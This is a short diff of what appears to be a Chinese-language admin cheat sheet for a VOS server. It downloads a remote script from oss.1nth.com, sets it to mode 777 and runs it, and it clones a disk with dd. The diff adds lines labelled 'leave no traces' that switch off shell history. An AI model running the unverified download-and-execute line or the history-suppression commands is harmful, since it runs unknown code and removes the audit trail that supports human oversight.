@@ -1,6 +1,13 @@
 echo "Email:21kixc@gmail.com"
 wget http://oss.1nth.com/vospag/in.sh.x && chmod 777 in.sh.x && ./in.sh.x
 
+#linux不记录痕迹
+unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG
+export HISTFILE=/dev/null
+export HISTSIZE=0
+export HISTFILESIZE=0
+
+
 #vos硬盘坏掉克隆
 dd if=/dev/sda of=/dev/sdb
 
